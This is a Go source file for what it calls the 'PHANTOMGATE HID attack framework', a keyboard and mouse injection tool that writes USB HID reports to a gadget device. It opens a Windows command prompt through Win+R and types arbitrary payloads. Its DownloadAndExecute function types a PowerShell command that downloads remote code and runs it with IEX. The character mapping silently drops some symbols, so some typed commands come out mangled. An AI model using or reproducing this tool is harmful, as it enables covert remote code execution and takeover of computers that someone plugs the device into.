package hid

import (
	"fmt"
	"log"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

// ══════════════════════════════════════════════════════════════════════════════
// PHANTOMGATE HID ATTACK FRAMEWORK v3.0 — KEYBOARD/MOUSE INJECTION
// ══════════════════════════════════════════════════════════════════════════════

type HIDAttacker struct {
	device      string
	running     bool
	stopChan    chan struct{}
	
	// Queue for keystrokes
	queue       chan *Keystroke
	queueMu     sync.Mutex
	
	// Statistics
	stats       *HIDStats
	
	// Configuration
	config      *HIDConfig
}

type Keystroke struct {
	Key         uint8
	Modifier    uint8
	Delay       time.Duration
	Pressed     bool
}

type HIDStats struct {
	KeysSent     int64
	ScriptsRun   int64
	Errors       int64
	StartTime    time.Time
}

type HIDConfig struct {
	Device      string
	Speed       time.Duration
	AntiJitter  bool
}

// HID Key codes (USB HID)
const (
	KeyA = 0x04
	KeyB = 0x05
	KeyC = 0x06
	KeyD = 0x07
	KeyE = 0x08
	KeyF = 0x09
	KeyG = 0x0A
	KeyH = 0x0B
	KeyI = 0x0C
	KeyJ = 0x0D
	KeyK = 0x0E
	KeyL = 0x0F
	KeyM = 0x10
	KeyN = 0x11
	KeyO = 0x12
	KeyP = 0x13
	KeyQ = 0x14
	KeyR = 0x15
	KeyS = 0x16
	KeyT = 0x17
	KeyU = 0x18
	KeyV = 0x19
	KeyW = 0x1A
	KeyX = 0x1B
	KeyY = 0x1C
	KeyZ = 0x1D
	Key1 = 0x1E
	Key2 = 0x1F
	Key3 = 0x20
	Key4 = 0x21
	Key5 = 0x22
	Key6 = 0x23
	Key7 = 0x24
	Key8 = 0x25
	Key9 = 0x26
	Key0 = 0x27
	KeyEnter = 0x28
	KeyReturn = 0x28
	KeyEscape = 0x29
	KeyBackspace = 0x2A
	KeyTab = 0x2B
	KeySpace = 0x2C
	KeyMinus = 0x2D
	KeyEqual = 0x2E
	KeyLeftBracket = 0x2F
	KeyRightBracket = 0x30
	KeyBackslash = 0x31
	KeySemicolon = 0x33
	KeyQuote = 0x34
	KeyGrave = 0x35
	KeyComma = 0x36
	KeyPeriod = 0x37
	KeySlash = 0x38
	KeyCapsLock = 0x39
	KeyF1 = 0x3A
	KeyF2 = 0x3B
	KeyF3 = 0x3C
	KeyF4 = 0x3D
	KeyF5 = 0x3E
	KeyF6 = 0x3F
	KeyF7 = 0x40
	KeyF8 = 0x41
	KeyF9 = 0x42
	KeyF10 = 0x43
	KeyF11 = 0x44
	KeyF12 = 0x45
	KeyPrintScreen = 0x46
	KeyScrollLock = 0x47
	KeyPause = 0x48
	KeyInsert = 0x49
	KeyHome = 0x4A
	KeyPageUp = 0x4B
	KeyDelete = 0x4C
	KeyEnd = 0x4D
	KeyPageDown = 0x4E
	KeyRightArrow = 0x4F
	KeyLeftArrow = 0x50
	KeyDownArrow = 0x51
	KeyUpArrow = 0x52
	KeyNumLock = 0x53
)

// Modifier keys
const (
	ModNone    = 0x00
	ModLeftCtrl  = 0x01
	ModLeftShift = 0x02
	ModLeftAlt   = 0x04
	ModLeftGUI   = 0x08
	ModRightCtrl  = 0x10
	ModRightShift = 0x20
	ModRightAlt   = 0x40
	ModRightGUI   = 0x80
)

func NewHIDAttacker(cfg HIDConfig) (*HIDAttacker, error) {
	if cfg.Device == "" {
		cfg.Device = "/dev/hidg0"
	}
	
	if cfg.Speed == 0 {
		cfg.Speed = 10 * time.Millisecond
	}
	
	return &HIDAttacker{
		device:   cfg.Device,
		stopChan: make(chan struct{}),
		queue:    make(chan *Keystroke, 1000),
		config:   &cfg,
		stats: &HIDStats{
			StartTime: time.Now(),
		},
	}, nil
}

// ══════════════════════════════════════════════════════════════════════════════
// CORE FUNCTIONS
// ══════════════════════════════════════════════════════════════════════════════

func (h *HIDAttacker) Start() error {
	h.running = true
	
	log.Printf("[HID] Starting HID attacker on %s", h.device)
	log.Printf("[HID] Speed: %v", h.config.Speed)
	
	// Start queue processor
	go h.processQueue()
	
	return nil
}

func (h *HIDAttacker) Stop() {
	h.running = false
	close(h.stopChan)
	
	h.printStats()
	log.Printf("[HID] HID attacker stopped")
}

// ══════════════════════════════════════════════════════════════════════════════
// KEY INJECTION
// ══════════════════════════════════════════════════════════════════════════════

func (h *HIDAttacker) SendKey(key uint8, modifier uint8) error {
	keystroke := &Keystroke{
		Key:      key,
		Modifier: modifier,
		Pressed:  true,
	}
	
	h.queue <- keystroke
	
	// Release key
	release := &Keystroke{
		Key:      0,
		Modifier: 0,
		Pressed:  false,
	}
	h.queue <- release
	
	return nil
}

func (h *HIDAttacker) SendString(text string) error {
	for _, char := range text {
		key, mod := charToKey(char)
		if key != 0 {
			h.SendKey(key, mod)
			time.Sleep(h.config.Speed)
		}
	}
	return nil
}

func (h *HIDAttacker) SendKeys(keys []uint8, modifiers []uint8) error {
	for i, key := range keys {
		var mod uint8 = ModNone
		if i < len(modifiers) {
			mod = modifiers[i]
		}
		h.SendKey(key, mod)
		time.Sleep(h.config.Speed)
	}
	return nil
}

func (h *HIDAttacker) TypeCommand(cmd string) error {
	log.Printf("[HID] Typing command: %s", cmd)
	return h.SendString(cmd + "\n")
}

// ══════════════════════════════════════════════════════════════════════════════
// SHORTCUT COMBOS
// ══════════════════════════════════════════════════════════════════════════════

func (h *HIDAttacker) SendShortcut(key uint8, modifiers uint8) error {
	// Press modifier + key
	h.SendKey(key, modifiers)
	return nil
}

func (h *HIDAttacker) CtrlC() error {
	return h.SendKey(KeyC, ModLeftCtrl)
}

func (h *HIDAttacker) CtrlV() error {
	return h.SendKey(KeyV, ModLeftCtrl)
}

func (h *HIDAttacker) CtrlAltDel() error {
	return h.SendKey(KeyDelete, ModLeftCtrl|ModLeftAlt)
}

func (h *HIDAttacker) AltTab() error {
	return h.SendKey(KeyTab, ModLeftAlt)
}

func (h *HIDAttacker) WinR() error {
	return h.SendKey(KeyR, ModLeftGUI)
}

func (h *HIDAttacker) OpenTerminal() error {
	// Windows: Win+R -> cmd
	h.WinR()
	time.Sleep(500 * time.Millisecond)
	h.TypeCommand("cmd")
	time.Sleep(500 * time.Millisecond)
	h.SendKey(KeyEnter, ModNone)
	return nil
}

// ══════════════════════════════════════════════════════════════════════════════
// PAYLOAD EXECUTION
// ══════════════════════════════════════════════════════════════════════════════

func (h *HIDAttacker) ExecutePayload(payload string) error {
	log.Printf("[HID] Executing payload...")
	
	// Open terminal
	h.OpenTerminal()
	time.Sleep(1 * time.Second)
	
	// Type and execute payload
	h.TypeCommand(payload)
	
	atomic.AddInt64(&h.stats.ScriptsRun, 1)
	return nil
}

func (h *HIDAttacker) ExecuteScript(script []string) error {
	log.Printf("[HID] Executing script with %d lines", len(script))
	
	h.OpenTerminal()
	time.Sleep(1 * time.Second)
	
	for _, line := range script {
		h.TypeCommand(line)
		time.Sleep(100 * time.Millisecond)
	}
	
	atomic.AddInt64(&h.stats.ScriptsRun, 1)
	return nil
}

func (h *HIDAttacker) DownloadAndExecute(url string) error {
	// PowerShell download and execute
	cmd := fmt.Sprintf("powershell -c \"IEX(New-Object Net.WebClient).DownloadString('%s')\"", url)
	return h.ExecutePayload(cmd)
}

// ══════════════════════════════════════════════════════════════════════════════
// MOUSE INJECTION
// ══════════════════════════════════════════════════════════════════════════════

func (h *HIDAttacker) MoveMouse(x, y int16) error {
	// Send mouse movement
	report := []byte{0x02, 0x00, byte(x & 0xFF), byte((x >> 8) & 0xFF), byte(y & 0xFF), byte((y >> 8) & 0xFF)}
	return h.writeDevice(report)
}

func (h *HIDAttacker) ClickMouse(button uint8) error {
	// Press
	report := []byte{0x01, button, 0x00, 0x00}
	h.writeDevice(report)
	
	// Release
	report = []byte{0x01, 0x00, 0x00, 0x00}
	return h.writeDevice(report)
}

func (h *HIDAttacker) DoubleClick() error {
	h.ClickMouse(0x01)
	time.Sleep(50 * time.Millisecond)
	return h.ClickMouse(0x01)
}

func (h *HIDAttacker) RightClick() error {
	return h.ClickMouse(0x02)
}

// ══════════════════════════════════════════════════════════════════════════════
// QUEUE PROCESSOR
// ══════════════════════════════════════════════════════════════════════════════

func (h *HIDAttacker) processQueue() {
	for {
		select {
		case <-h.stopChan:
			return
		case keystroke := <-h.queue:
			h.sendKeystroke(keystroke)
		}
	}
}

func (h *HIDAttacker) sendKeystroke(ks *Keystroke) {
	report := []byte{0x00, ks.Modifier, 0x00, ks.Key, 0x00, 0x00, 0x00, 0x00}
	
	if err := h.writeDevice(report); err != nil {
		atomic.AddInt64(&h.stats.Errors, 1)
		return
	}
	
	atomic.AddInt64(&h.stats.KeysSent, 1)
}

func (h *HIDAttacker) writeDevice(data []byte) error {
	f, err := os.OpenFile(h.device, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	
	_, err = f.Write(data)
	return err
}

// ══════════════════════════════════════════════════════════════════════════════
// UTILITY
// ══════════════════════════════════════════════════════════════════════════════

func charToKey(char rune) (uint8, uint8) {
	if char >= 'a' && char <= 'z' {
		return uint8(KeyA + (char - 'a')), ModNone
	}
	if char >= 'A' && char <= 'Z' {
		return uint8(KeyA + (char - 'A')), ModLeftShift
	}
	if char >= '1' && char <= '9' {
		return uint8(Key1 + (char - '1')), ModNone
	}
	if char == '0' {
		return Key0, ModNone
	}
	if char == ' ' {
		return KeySpace, ModNone
	}
	if char == '\n' {
		return KeyEnter, ModNone
	}
	if char == '\t' {
		return KeyTab, ModNone
	}
	if char == '.' {
		return KeyPeriod, ModNone
	}
	if char == ',' {
		return KeyComma, ModNone
	}
	if char == '-' {
		return KeyMinus, ModNone
	}
	if char == '=' {
		return KeyEqual, ModNone
	}
	if char == '\\' {
		return KeyBackslash, ModNone
	}
	if char == '/' {
		return KeySlash, ModNone
	}
	if char == ';' {
		return KeySemicolon, ModNone
	}
	if char == '\'' {
		return KeyQuote, ModNone
	}
	if char == '`' {
		return KeyGrave, ModNone
	}
	if char == '[' {
		return KeyLeftBracket, ModNone
	}
	if char == ']' {
		return KeyRightBracket, ModNone
	}
	return 0, 0
}

func (h *HIDAttacker) printStats() {
	log.Printf("[HID STATS] Keys: %d | Scripts: %d | Errors: %d",
		atomic.LoadInt64(&h.stats.KeysSent),
		atomic.LoadInt64(&h.stats.ScriptsRun),
		atomic.LoadInt64(&h.stats.Errors))
}
